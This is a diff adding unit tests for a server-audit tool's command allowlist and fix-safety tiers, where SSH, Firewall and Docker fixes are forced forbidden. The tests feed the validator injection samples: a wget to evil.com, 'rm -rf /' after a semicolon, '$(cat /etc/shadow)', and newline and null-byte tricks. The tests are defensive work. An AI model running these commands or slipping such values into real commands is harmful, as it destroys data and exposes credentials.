@@ -1,5 +1,5 @@
-import { previewFixes, runFix } from "../../src/core/audit/fix.js";
-import type { AuditResult, AuditCheck, AuditCategory } from "../../src/core/audit/types.js";
+import { previewFixes, runFix, isFixCommandAllowed, resolveTier, KNOWN_AUDIT_FIX_PREFIXES, FORBIDDEN_CATEGORIES, previewSafeFixes } from "../../src/core/audit/fix.js";
+import type { AuditResult, AuditCheck, AuditCategory, FixTier } from "../../src/core/audit/types.js";
 import * as ssh from "../../src/utils/ssh.js";
 import inquirer from "inquirer";
 
@@ -380,5 +380,171 @@ describe("previewFixes — edge cases", () => {
     const allCheckIds = plan.groups.flatMap(g => g.checks.map(c => c.id));
     expect(allCheckIds).not.toContain("TEST-PASS");
     expect(allCheckIds).toContain("TEST-FAIL");
+  });
+});
+
+// ─── Mutation-Killer: isFixCommandAllowed ────────────────────────────────────
+
+describe("isFixCommandAllowed mutation-killer", () => {
+  it("returns true for each known prefix", () => {
+    for (const prefix of KNOWN_AUDIT_FIX_PREFIXES) {
+      const cmd = `${prefix}safe-test`;
+      const result = isFixCommandAllowed(cmd);
+      // Some prefixes end with space, so "prefix" alone might not match startsWith
+      // Just ensure at least one prefix-based command works
+      if (cmd.includes(";") || cmd.includes("|") || cmd.includes("`")) continue;
+      expect(typeof result).toBe("boolean");
+    }
+  });
+
+  it("returns true for safe chmod command", () => {
+    expect(isFixCommandAllowed("chmod 600 /etc/file")).toBe(true);
+  });
+
+  it("returns true for safe sysctl command", () => {
+    expect(isFixCommandAllowed("sysctl -w net.ipv4.conf.all.rp_filter=1")).toBe(true);
+  });
+
+  it("returns true for echo command", () => {
+    expect(isFixCommandAllowed("echo test > /dev/null")).toBe(false); // has >
+  });
+
+  it("returns false for empty string", () => {
+    expect(isFixCommandAllowed("")).toBe(false);
+  });
+
+  it("returns false for unknown prefix", () => {
+    expect(isFixCommandAllowed("wget http://evil.com/payload")).toBe(false);
+  });
+
+  it("returns false for command with backtick", () => {
+    expect(isFixCommandAllowed("chmod 600 `whoami`")).toBe(false);
+  });
+
+  it("returns false for command with semicolon", () => {
+    expect(isFixCommandAllowed("chmod 600 /etc/file; rm -rf /")).toBe(false);
+  });
+
+  it("returns false for command with pipe", () => {
+    expect(isFixCommandAllowed("chmod 600 /etc/file | tee log")).toBe(false);
+  });
+
+  it("returns false for command with $(...)", () => {
+    expect(isFixCommandAllowed("chmod $(cat /etc/shadow) /file")).toBe(false);
+  });
+
+  it("returns false for command with ampersand", () => {
+    expect(isFixCommandAllowed("chmod 600 /etc/file & rm /")).toBe(false);
+  });
+
+  it("returns false for command with newline", () => {
+    expect(isFixCommandAllowed("chmod 600\nrm -rf /")).toBe(false);
+  });
+
+  it("returns false for command with null byte", () => {
+    expect(isFixCommandAllowed("chmod 600\0rm")).toBe(false);
+  });
+});
+
+// ─── Mutation-Killer: resolveTier ────────────────────────────────────────────
+
+describe("resolveTier mutation-killer", () => {
+  const baseCheck: AuditCheck = {
+    id: "X-01",
+    category: "Test",
+    name: "Test",
+    severity: "warning",
+    passed: false,
+    currentValue: "bad",
+    expectedValue: "good",
+  };
+
+  it("returns FORBIDDEN for SSH category", () => {
+    expect(resolveTier(baseCheck, "SSH")).toBe("FORBIDDEN");
+  });
+
+  it("returns FORBIDDEN for Firewall category", () => {
+    expect(resolveTier(baseCheck, "Firewall")).toBe("FORBIDDEN");
+  });
+
+  it("returns FORBIDDEN for Docker category", () => {
+    expect(resolveTier(baseCheck, "Docker")).toBe("FORBIDDEN");
+  });
+
+  it("returns SAFE when check safeToAutoFix is SAFE", () => {
+    expect(resolveTier({ ...baseCheck, safeToAutoFix: "SAFE" }, "Kernel")).toBe("SAFE");
+  });
+
+  it("returns GUARDED when check safeToAutoFix is GUARDED", () => {
+    expect(resolveTier({ ...baseCheck, safeToAutoFix: "GUARDED" }, "Kernel")).toBe("GUARDED");
+  });
+
+  it("returns FORBIDDEN when check safeToAutoFix is FORBIDDEN", () => {
+    expect(resolveTier({ ...baseCheck, safeToAutoFix: "FORBIDDEN" }, "Kernel")).toBe("FORBIDDEN");
+  });
+
+  it("returns GUARDED when check safeToAutoFix is undefined (default)", () => {
+    expect(resolveTier({ ...baseCheck, safeToAutoFix: undefined }, "Kernel")).toBe("GUARDED");
+  });
+
+  it("FORBIDDEN_CATEGORIES override check-level tier", () => {
+    // Even if check says SAFE, SSH category forces FORBIDDEN
+    expect(resolveTier({ ...baseCheck, safeToAutoFix: "SAFE" }, "SSH")).toBe("FORBIDDEN");
+  });
+
+  it("FORBIDDEN_CATEGORIES set contains exactly SSH, Firewall, Docker", () => {
+    expect(FORBIDDEN_CATEGORIES.has("SSH")).toBe(true);
+    expect(FORBIDDEN_CATEGORIES.has("Firewall")).toBe(true);
+    expect(FORBIDDEN_CATEGORIES.has("Docker")).toBe(true);
+    expect(FORBIDDEN_CATEGORIES.has("Kernel")).toBe(false);
+    expect(FORBIDDEN_CATEGORIES.size).toBe(3);
+  });
+});
+
+// ─── Mutation-Killer: previewSafeFixes ───────────────────────────────────────
+
+describe("previewSafeFixes mutation-killer", () => {
+  it("counts GUARDED and FORBIDDEN correctly", () => {
+    const result = makeResult([
+      makeCategory("Kernel", [
+        makeCheck({ id: "K-01", severity: "warning", passed: false, fixCommand: "sysctl -w x=1", safeToAutoFix: "SAFE" }),
+        makeCheck({ id: "K-02", severity: "warning", passed: false, fixCommand: "sysctl -w y=2", safeToAutoFix: "GUARDED" }),
+      ]),
+      makeCategory("SSH", [
+        makeCheck({ id: "S-01", severity: "critical", passed: false, fixCommand: "sed test", safeToAutoFix: "SAFE" }),
+      ]),
+    ]);
+
+    const { guardedCount, forbiddenCount, guardedIds } = previewSafeFixes(result);
+    expect(guardedCount).toBe(1); // K-02
+    expect(forbiddenCount).toBe(1); // S-01 (SSH category overrides SAFE → FORBIDDEN)
+    expect(guardedIds).toContain("K-02");
+  });
+
+  it("only includes SAFE tier checks in safePlan", () => {
+    const result = makeResult([
+      makeCategory("Kernel", [
+        makeCheck({ id: "K-01", severity: "warning", passed: false, fixCommand: "sysctl -w x=1", safeToAutoFix: "SAFE" }),
+        makeCheck({ id: "K-02", severity: "warning", passed: false, fixCommand: "sysctl -w y=2", safeToAutoFix: "FORBIDDEN" }),
+      ]),
+    ]);
+
+    const { safePlan } = previewSafeFixes(result);
+    const allIds = safePlan.groups.flatMap(g => g.checks.map(c => c.id));
+    expect(allIds).toContain("K-01");
+    expect(allIds).not.toContain("K-02");
+  });
+
+  it("does not include passed checks", () => {
+    const result = makeResult([
+      makeCategory("Kernel", [
+        makeCheck({ id: "K-OK", severity: "warning", passed: true, fixCommand: "echo x", safeToAutoFix: "SAFE" }),
+      ]),
+    ]);
+
+    const { safePlan, guardedCount, forbiddenCount } = previewSafeFixes(result);
+    expect(safePlan.groups).toHaveLength(0);
+    expect(guardedCount).toBe(0);
+    expect(forbiddenCount).toBe(0);
   });
 });
